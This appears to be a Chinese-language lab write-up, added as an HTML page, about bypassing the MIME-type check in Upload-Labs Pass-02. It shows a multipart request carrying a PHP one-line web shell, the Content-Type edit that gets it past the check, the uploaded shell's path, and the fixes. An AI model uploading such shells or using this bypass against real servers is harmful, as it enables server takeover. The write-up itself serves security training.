@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Upload-Labs Pass-02 MIME 类型校验绕过 Writeup - gz2008的技术博客</title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      padding: 40px 20px;
+      color: #1e293b;
+      background: #f6f9fc;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif;
+      line-height: 1.8;
+    }
+    .container {
+      width: min(860px, 100%);
+      margin: 0 auto;
+      padding: 40px;
+      background: #fff;
+      border-radius: 18px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, .06);
+    }
+    .back-link { color: #2563eb; text-decoration: none; font-weight: 600; }
+    .back-link:hover { text-decoration: underline; }
+    h1 {
+      margin: 20px 0 10px;
+      padding-bottom: 15px;
+      border-bottom: 2px solid #eef2f6;
+      color: #0f172a;
+      font-size: clamp(1.8rem, 5vw, 2.3rem);
+      line-height: 1.35;
+    }
+    .tags { margin: 12px 0 26px; }
+    .tag {
+      display: inline-block;
+      margin: 0 8px 8px 0;
+      padding: 4px 12px;
+      color: #2563eb;
+      background: #eff6ff;
+      border-radius: 20px;
+      font-size: .85rem;
+      font-weight: 600;
+    }
+    h2 {
+      margin-top: 34px;
+      padding-left: 10px;
+      border-left: 4px solid #3b82f6;
+      color: #1e293b;
+      font-size: 1.35rem;
+    }
+    h3 { margin-top: 24px; color: #334155; font-size: 1.05rem; }
+    p, li { color: #475569; }
+    code {
+      padding: 2px 5px;
+      color: #be123c;
+      background: #f1f5f9;
+      border-radius: 4px;
+      font-family: Consolas, "SFMono-Regular", monospace;
+      overflow-wrap: anywhere;
+    }
+    pre {
+      padding: 16px;
+      color: #e2e8f0;
+      background: #172033;
+      border-radius: 8px;
+      overflow-x: auto;
+      font-family: Consolas, "SFMono-Regular", monospace;
+      font-size: .9rem;
+      line-height: 1.6;
+    }
+    pre code { padding: 0; color: inherit; background: none; }
+    figure { margin: 24px 0; }
+    figure img {
+      display: block;
+      width: 100%;
+      height: auto;
+      border: 1px solid #e2e8f0;
+      border-radius: 10px;
+      box-shadow: 0 6px 20px rgba(15, 23, 42, .07);
+    }
+    figcaption {
+      margin-top: 9px;
+      color: #64748b;
+      font-size: .9rem;
+      text-align: center;
+    }
+    .note, .success {
+      margin: 18px 0;
+      padding: 13px 16px;
+      border-left: 4px solid #f97316;
+      background: #fff7ed;
+      color: #9a3412;
+    }
+    .success {
+      border-left-color: #22c55e;
+      background: #f0fdf4;
+      color: #166534;
+    }
+    table { width: 100%; margin: 16px 0; border-collapse: collapse; }
+    th, td { padding: 9px 11px; border: 1px solid #e2e8f0; text-align: left; }
+    th { color: #1e3a8a; background: #eff6ff; }
+    @media (max-width: 640px) {
+      body { padding: 0; }
+      .container { padding: 24px 18px; border-radius: 0; }
+      table { display: block; overflow-x: auto; }
+    }
+  </style>
+</head>
+<body>
+  <main class="container">
+    <a class="back-link" href="index.html">← 返回 Upload-Labs 首页</a>
+
+    <h1>Upload-Labs Pass-02：MIME 类型校验绕过</h1>
+    <div class="tags">
+      <span class="tag"># Upload-Labs</span>
+      <span class="tag"># Web</span>
+      <span class="tag"># File Upload</span>
+      <span class="tag"># Burp Suite</span>
+      <span class="tag"># MIME</span>
+    </div>
+
+    <p>本文记录本机授权靶场 <code>http://127.0.0.1.nip.io:8081/Pass-02/</code> 的实验过程。关卡要求向服务器上传一个 PHP 文件；本次通过 Burp Suite 截获 multipart 请求，把文件字段的 <code>Content-Type</code> 改为 <code>image/png</code>，从而通过服务端 MIME 类型检查。</p>
+
+    <h2>一、实验信息</h2>
+    <table>
+      <tr><th>项目</th><th>内容</th></tr>
+      <tr><td>靶场</td><td>Upload-Labs</td></tr>
+      <tr><td>关卡</td><td>Pass-02</td></tr>
+      <tr><td>漏洞类型</td><td>客户端可控 MIME 类型校验绕过</td></tr>
+      <tr><td>工具</td><td>Burp Suite、浏览器</td></tr>
+      <tr><td>验证目标</td><td>上传 PHP 文件并通过 Web 路径访问</td></tr>
+    </table>
+
+    <h2>二、功能观察</h2>
+    <p>Pass-02 的页面同样提示“请选择要上传的图片”。直接选择一个名为 <code>一句话木马.php</code> 的文件后，页面允许继续提交，说明浏览器端没有有效拦截 PHP 扩展名。</p>
+
+    <figure>
+      <img src="assets/upload_labs_pass02_page.png" alt="Upload-Labs Pass-02 选择 PHP 文件">
+      <figcaption>上传控件写着“图片”，但实际可以选择并提交 PHP 文件。</figcaption>
+    </figure>
+
+    <p>开启 Burp 拦截后点击“上传”，可以从 HTTP history 中看到请求发往 <code>POST /Pass-02/</code>。此时文件字段的原始声明为 <code>Content-Type: application/octet-stream</code>，文件名仍保留 <code>.php</code> 扩展名。</p>
+
+    <figure>
+      <img src="assets/upload_labs_pass02_request.png" alt="Burp 捕获 Pass-02 文件上传请求">
+      <figcaption>Burp 捕获到的 multipart 上传请求。</figcaption>
+    </figure>
+
+    <h2>三、请求与载荷</h2>
+    <p>请求中真正决定上传内容的字段如下。为了方便展示，示例边界值使用占位符；实际复现时保持抓包得到的 boundary 不变即可。</p>
+
+    <pre><code>POST /Pass-02/ HTTP/1.1
+Host: 127.0.0.1.nip.io:8081
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryEXAMPLE
+
+------WebKitFormBoundaryEXAMPLE
+Content-Disposition: form-data; name="upload_file"; filename="一句话木马.php"
+Content-Type: application/octet-stream
+
+&lt;?php @eval($_POST['pass']); ?&gt;
+------WebKitFormBoundaryEXAMPLE
+Content-Disposition: form-data; name="submit"
+
+上传
+------WebKitFormBoundaryEXAMPLE--</code></pre>
+
+    <figure>
+      <img src="assets/upload_labs_pass02_payload.png" alt="Burp 请求中的 PHP 文件名和载荷">
+      <figcaption>原始请求保留了 <code>.php</code> 文件名，脚本内容也已进入 multipart 请求体。</figcaption>
+    </figure>
+
+    <h2>四、漏洞定位与绕过</h2>
+    <p>本关的信任边界位于文件类型判断。服务端根据请求方提供的 MIME 类型判断文件是不是图片，却没有根据文件真实内容或最终扩展名重新做安全判定。因此，只要把文件字段的 <code>Content-Type</code> 改成允许值，PHP 文件就可以继续进入保存流程。</p>
+
+    <p>在 Burp Repeater 中，仅修改文件字段的这一行：</p>
+
+    <pre><code>Content-Type: image/png</code></pre>
+
+    <p><code>filename="一句话木马.php"</code> 保持不变。这里要区分两个值：<code>filename</code> 决定服务器最终使用的文件名，而 <code>Content-Type</code> 只是客户端附带的类型声明。将后者改为 <code>image/png</code> 后重新发送，页面返回上传成功状态，并显示一个损坏图片占位框。</p>
+
+    <figure>
+      <img src="assets/upload_labs_pass02_mime.png" alt="修改 Content-Type 为 image/png 后上传成功">
+      <figcaption>文件扩展名仍为 <code>.php</code>，只把 MIME 改为 <code>image/png</code> 就通过了校验。</figcaption>
+    </figure>
+
+    <div class="success">修改 MIME 后上传流程通过，说明服务端信任了客户端可控的 <code>Content-Type</code>，而不是检查真实文件内容。</div>
+
+    <h2>五、访问结果与验证边界</h2>
+    <p>上传文件可从下面的地址直接访问：</p>
+
+    <pre><code>http://127.0.0.1.nip.io:8081/upload/一句话木马.php</code></pre>
+
+    <figure>
+      <img src="assets/upload_labs_pass02_access.png" alt="直接访问上传后的 PHP 文件">
+      <figcaption>上传后的 PHP 路径可以被浏览器直接访问，响应正文为空。</figcaption>
+    </figure>
+
+    <div class="note">本次截图证明了文件成功上传且上传目录可通过 Web 访问，但空白响应本身不能证明命令执行成功。脚本只有在请求中提供 <code>pass</code> 参数时才会进入 <code>eval()</code>；截图没有包含命令回显，也没有单独 Flag。因此本文不把“页面可访问”扩大表述为“RCE 已验证”。若继续验证，应提交只输出固定标记的无副作用的 POST 请求，并单独记录响应。</div>
+
+    <h2>六、影响与修复</h2>
+    <p>服务端把客户端声明的 MIME 当作安全判断依据，使攻击者可以用披着图片类型的 PHP 文件穿过上传校验。一旦上传目录允许脚本执行，任意文件上传就可能进一步演变为服务器代码执行。</p>
+
+    <ul>
+      <li>服务端必须使用扩展名白名单，并且不能信任客户端提交的 <code>Content-Type</code>。</li>
+      <li>使用 <code>finfo_file()</code>、图像解码或其他内容检测方法识别真实文件类型。</li>
+      <li>对图片重新编码，去除附加在图片数据后的可执行内容。</li>
+      <li>由服务端生成随机文件名和固定安全扩展名，不接受客户端指定最终路径。</li>
+      <li>将上传目录移出 Web 根目录，或禁用该目录中的脚本解析权限。</li>
+    </ul>
+
+    <h2>七、复盘</h2>
+    <p>Pass-02 的关键不是复杂的木马内容，而是请求元数据与服务端信任边界之间的错位。实验时把“MIME 校验被绕过”“文件成功写入”“Web 路径可访问”和“代码执行已验证”拆开记录，证据边界会更清楚。本关的最终修复仍应落到服务端的内容验证、重命名和禁止上传目录执行脚本上。</p>
+  </main>
+</body>
+</html>
